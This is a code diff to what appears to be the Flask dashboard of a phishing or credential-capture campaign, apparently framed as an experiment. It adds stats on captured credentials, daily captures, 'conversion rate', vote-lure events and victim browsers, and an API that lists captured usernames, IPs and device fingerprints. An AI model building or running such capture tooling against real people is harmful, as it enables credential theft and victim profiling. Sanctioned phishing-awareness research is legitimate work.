@@ -385,6 +385,8 @@ def get_stats():
     c = conn.cursor()
     c.execute("SELECT COUNT(*) FROM captured_credentials")
     total = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM captured_credentials WHERE DATE(timestamp) = DATE('now')")
+    today = c.fetchone()[0]
     c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'")
     sessions = c.fetchone()[0]
     conversion_rate = (total / sessions * 100) if sessions > 0 else 0
@@ -393,12 +395,35 @@ def get_stats():
         GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7
     ''')
     daily = c.fetchall()
+    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type LIKE '%VOTE%' OR event_type LIKE '%TOP3%'")
+    votes = c.fetchone()[0]
+    # Device stats from user_agent
+    c.execute("SELECT user_agent FROM captured_credentials WHERE user_agent IS NOT NULL")
+    agents = c.fetchall()
+    devices = {"chrome": 0, "safari": 0, "firefox": 0, "other": 0}
+    for (ua,) in agents:
+        ua_lower = (ua or "").lower()
+        if "chrome" in ua_lower and "chromium" not in ua_lower:
+            devices["chrome"] += 1
+        elif "safari" in ua_lower:
+            devices["safari"] += 1
+        elif "firefox" in ua_lower:
+            devices["firefox"] += 1
+        else:
+            devices["other"] += 1
     conn.close()
     return jsonify({
-        "total_sessions": sessions,
+        "captures": total,
+        "sessions": sessions,
+        "votes": votes,
+        "campaigns": 4,
+        "active_campaigns": 1,
+        "captures_today": today,
         "total_captures": total,
+        "total_sessions": sessions,
         "conversion_rate_pct": round(conversion_rate, 2),
-        "daily_stats": [{"date": d, "count": c} for d, c in daily]
+        "daily_stats": [{"date": d, "count": c} for d, c in daily],
+        "devices": devices,
     })
 
 
@@ -450,13 +475,14 @@ def api_captures():
     conn.close()
     return jsonify([{
         "id": r[0], "participant_id": r[1], "username": r[2],
-        "has_password": bool(r[3]), "ip": r[4],
+        "has_password": bool(r[3]), "ip_address": r[4], "ip": r[4],
         "user_agent": r[5][:80] if r[5] else "",
         "timestamp": r[6],
         "screen": r[7] or "", "timezone": r[8] or "",
         "lang": r[9] or "", "platform": r[10] or "",
         "time_on_page": r[11], "referrer": r[12] or "",
-        "clicks": r[13], "step": r[14] or ""
+        "clicks": r[13], "step": r[14] or "",
+        "pseudo": r[2] or ""
     } for r in rows])
 
 
